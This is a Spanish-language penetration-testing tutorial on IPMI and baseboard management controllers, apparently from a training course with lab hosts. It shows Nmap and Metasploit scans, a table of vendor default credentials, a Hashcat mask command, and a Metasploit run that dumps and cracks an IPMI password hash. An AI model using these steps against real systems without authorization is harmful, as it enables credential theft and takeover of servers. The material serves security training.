[Intelligent Platform Management Interface](https://www.thomas-krenn.com/en/wiki/IPMI_Basics) (`IPMI`) es un conjunto de especificaciones estandarizadas para sistemas de gestión de hardware utilizados para la administración y monitorización de sistemas. Actúa como un subsistema autónomo y funciona independientemente del BIOS, CPU, firmware y sistema operativo subyacente del host. IPMI proporciona a los administradores de sistemas la capacidad de gestionar y monitorear sistemas incluso si están apagados o en un estado no receptivo. Opera usando una conexión de red directa al hardware del sistema y no requiere acceso al sistema operativo mediante una shell de inicio de sesión. IPMI también puede ser utilizado para actualizaciones remotas a los sistemas sin necesidad de acceso físico al host objetivo. IPMI se utiliza típicamente de tres maneras:

- Antes de que el sistema operativo haya arrancado para modificar la configuración del BIOS
- Cuando el host está completamente apagado
- Acceso a un host después de una falla del sistema

Cuando no se usa para estas tareas, IPMI puede monitorear una variedad de cosas diferentes como la temperatura del sistema, voltaje, estado de los ventiladores y fuentes de alimentación. También puede ser utilizado para consultar información de inventario, revisar registros de hardware y alertar utilizando SNMP. El sistema host puede estar apagado, pero el módulo IPMI requiere una fuente de alimentación y una conexión LAN para funcionar correctamente.

El protocolo IPMI fue publicado por primera vez por Intel en 1998 y ahora es compatible con más de 200 proveedores de sistemas, incluidos Cisco, Dell, HP, Supermicro, Intel y más. Los sistemas que utilizan la versión 2.0 de IPMI pueden ser administrados vía serial sobre LAN, dando a los administradores de sistemas la capacidad de ver la salida de la consola serial en banda. Para funcionar, IPMI requiere los siguientes componentes:

- **Baseboard Management Controller (BMC)** - Un microcontrolador y componente esencial de IPMI
- **Intelligent Chassis Management Bus (ICMB)** - Una interfaz que permite la comunicación de un chasis a otro
- **Intelligent Platform Management Bus (IPMB)** - Extiende el BMC
- **IPMI Memory** - Almacena cosas como el registro de eventos del sistema, datos de almacenamiento del repositorio y más
- **Interfaces de Comunicaciones** - Interfaces de sistema local, interfaces serial y LAN, ICMB y PCI Management Bus

---
## Footprinting the Service

IPMI se comunica sobre el puerto 623 UDP. Los sistemas que utilizan el protocolo IPMI se llaman Baseboard Management Controllers (BMCs). Los BMCs generalmente se implementan como sistemas ARM embebidos que ejecutan Linux y están conectados directamente a la placa base del host. Los BMCs están integrados en muchas placas base, pero también pueden ser añadidos a un sistema como una tarjeta PCI. La mayoría de los servidores vienen con un BMC o soportan la adición de un BMC. Los BMCs más comunes que solemos ver durante las pruebas de penetración internas son HP iLO, Dell DRAC y Supermicro IPMI. Si podemos acceder a un BMC durante una evaluación, obtendríamos acceso completo a la placa base del host y podríamos monitorear, reiniciar, apagar o incluso reinstalar el sistema operativo del host. Acceder a un BMC es casi equivalente a tener acceso físico a un sistema. Muchos BMCs (incluyendo HP iLO, Dell DRAC y Supermicro IPMI) exponen una consola de gestión basada en web, algún tipo de protocolo de acceso remoto por línea de comandos como Telnet o SSH, y el puerto 623 UDP, que, nuevamente, es para el protocolo de red IPMI. A continuación se muestra un escaneo Nmap utilizando el script NSE [ipmi-version](https://nmap.org/nsedoc/scripts/ipmi-version.html) de Nmap para obtener una huella del servicio.

### Nmap

```r
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

Aquí, podemos ver que el protocolo IPMI está escuchando en el puerto 623, y Nmap ha identificado la versión 2.0 del protocolo. También podemos usar el módulo escáner de Metasploit [IPMI Information Discovery (auxiliary/scanner/ipmi/ipmi_version)](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/).

### Metasploit Version Scan

```r
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Durante las pruebas de penetración internas, a menudo encontramos BMCs donde los administradores no han cambiado la contraseña predeterminada. Algunas contraseñas predeterminadas únicas para mantener en nuestras hojas de trucos incluyen:

| Producto        | Nombre de usuario | Contraseña                                                                  |
| --------------- | ----------------- | --------------------------------------------------------------------------- |
| Dell iDRAC      | root              | calvin                                                                      |
| HP iLO          | Administrator     | cadena aleatoria de 8 caracteres que consiste en números y letras mayúsculas|
| Supermicro IPMI | ADMIN             | ADMIN                                                                       |

También es esencial probar las contraseñas predeterminadas conocidas para cualquier servicio que descubramos, ya que a menudo se dejan sin cambiar y pueden llevar a victorias rápidas. Cuando se trata de BMCs, estas contraseñas predeterminadas pueden darnos acceso a la consola web o incluso acceso por línea de comandos vía SSH o Telnet.

---
## Dangerous Settings

Si las credenciales predeterminadas no funcionan para acceder a un BMC, podemos recurrir a una [falla](http://fish2.com/ipmi/remote-pw-cracking.html) en el protocolo RAKP en IPMI 2.0. Durante el proceso de autenticación, el servidor envía un hash SHA1 o MD5 salado de la contraseña del usuario al cliente antes de que tenga lugar la autenticación. Esto puede ser aprovechado para obtener el hash de la contraseña de cualquier cuenta de usuario válida en el BMC. Estos hashes de contraseña pueden luego ser descifrados fuera de línea utilizando un ataque de diccionario con `Hashcat` en modo `7300`. En el caso de un HP iLO utilizando una contraseña predeterminada de fábrica, podemos usar este comando de ataque con máscara de Hashcat `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u` que intenta todas las combinaciones de letras mayúsculas y números para una contraseña de ocho caracteres.

No hay una "solución" directa para este problema porque la falla es un componente crítico de la especificación IPMI. Los clientes pueden optar por contraseñas muy largas y difíciles de descifrar o implementar reglas de segmentación de red para restringir el acceso directo a los BMCs. Es importante no pasar por alto IPMI durante las pruebas de penetración internas (lo vemos durante la mayoría de las evaluaciones) porque no solo podemos obtener acceso a la consola web del BMC, que es un hallazgo de alto riesgo, sino que hemos visto entornos donde se establece una contraseña única (pero descifrable) que luego se reutiliza en otros sistemas. En una de estas pruebas de penetración, obtuvimos un hash de IPMI, lo desciframos fuera de línea usando Hashcat y pudimos acceder por SSH a muchos servidores críticos en el entorno como usuario root y obtener acceso a consolas de gestión web para varias herramientas de monitoreo de red.

Para recuperar hashes de IPMI, podemos usar el módulo Metasploit [IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/).

### Metasploit Dumping Hashes

```r
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Aquí podemos ver que hemos obtenido con éxito el hash de la contraseña para el usuario `ADMIN`, y la herramienta pudo descifrarlo rápidamente para revelar lo que parece ser una contraseña predeterminada `ADMIN`. A partir de aquí, podríamos intentar iniciar sesión en el BMC o, si la contraseña fuera algo más único, verificar la reutilización de contraseñas en otros sistemas. IPMI es muy común en entornos de red ya que los administradores de sistemas necesitan poder acceder a los servidores de forma remota en caso de una interrupción o realizar ciertas tareas de mantenimiento que tradicionalmente habrían tenido que estar físicamente frente al servidor para completar. Esta facilidad de administración viene con el riesgo de exponer hashes de contraseñas a cualquiera en la red y puede llevar a accesos no autorizados, interrupciones del sistema e incluso ejecución remota de código. Verificar IPMI debería ser parte de nuestro manual de pruebas de penetración internas para cualquier entorno que evaluemos.